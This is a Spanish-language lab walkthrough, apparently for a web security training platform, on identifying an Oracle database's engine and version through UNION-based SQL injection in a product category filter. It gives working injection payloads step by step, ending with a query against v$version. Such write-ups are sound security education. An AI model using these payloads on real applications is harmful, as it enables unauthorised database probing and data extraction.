# 💉 Ataque UNION: identificación de versión y motor de base de datos (Oracle)

## 📄 Descripción del laboratorio

Este laboratorio contiene una vulnerabilidad de **inyección SQL** en el filtro de categoría de productos. La aplicación devuelve los resultados de la consulta directamente en la respuesta, lo que permite realizar un **ataque UNION SELECT** para inyectar consultas arbitrarias.

El objetivo es identificar el **motor de base de datos** utilizado por la aplicación y mostrar su **cadena de versión**. En este caso, la base de datos utilizada es **Oracle**.



## 📚 Teoría

### 📌 Identificación del motor y versión de base de datos

En fases tempranas de una explotación de SQL Injection es fundamental identificar el motor de base de datos utilizado por la aplicación. Cada motor tiene:

* Sintaxis específica.
* Funciones internas distintas.
* Tablas de sistema diferentes.

Conocer el motor y su versión permite adaptar los payloads a las características del sistema objetivo.

En Oracle, la información sobre la versión del motor se encuentra en la tabla de sistema:

```
v$version
```

Dentro de esta tabla, la columna más relevante es:

```
banner
```

Esta columna devuelve una cadena con información completa sobre el producto, la edición y la versión del motor Oracle.

Otra característica importante de Oracle es que **no permite ejecutar una consulta SELECT sin una cláusula FROM**. Para resolver esto, Oracle incluye una tabla especial llamada:

```
dual
```

Esta tabla se utiliza cuando se necesita ejecutar una consulta que no depende de datos reales.



## 📝 Práctica

### 1️⃣ Determinar el número de columnas

Interceptamos la petición que filtra los productos por categoría y la enviamos a **Burp Repeater**.

Probamos a determinar el número de columnas utilizando `ORDER BY`:

```
/filter?category=' ORDER BY 1--
/filter?category=' ORDER BY 2--
/filter?category=' ORDER BY 3--
```

Resultados:

```
ORDER BY 1 → funciona
ORDER BY 2 → funciona
ORDER BY 3 → error
```

Conclusión: la consulta original devuelve **2 columnas**.

### 2️⃣ Confirmar que UNION funciona en Oracle

Probamos un ataque UNION básico utilizando la tabla `dual`:

```
/filter?category=' UNION SELECT 'a','b' FROM dual--
```

<img width="1520" height="959" alt="image" src="https://github.com/user-attachments/assets/afb8cc2a-0f42-4828-9a44-7e193d110797" />
<br>

Resultado:

La respuesta de la aplicación muestra una fila adicional con los valores:

```
a
b
```

Esto confirma que:

* El ataque UNION funciona correctamente.
* Ambas columnas pueden mostrar datos.
* La sintaxis es compatible con Oracle.



### 3️⃣ Extraer la versión de la base de datos

Ahora utilizamos la tabla de sistema `v$version` para obtener la información del motor.

Payload final:

```
/filter?category=' UNION SELECT NULL,banner FROM v$version--
```

Este payload:

1. Mantiene el número correcto de columnas.
2. Inserta el valor de `banner` en la columna visible.

<img width="1520" height="973" alt="image" src="https://github.com/user-attachments/assets/c8206b8a-ede6-4c3d-ac99-ff06becc2388" />



### 4️⃣ Resultado

La respuesta de la aplicación muestra una cadena similar a:

```
Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production
```

Esto confirma que la base de datos utilizada por la aplicación es **Oracle** y revela su versión exacta.

El laboratorio detecta que la cadena de versión ha sido mostrada y se marca como completado.
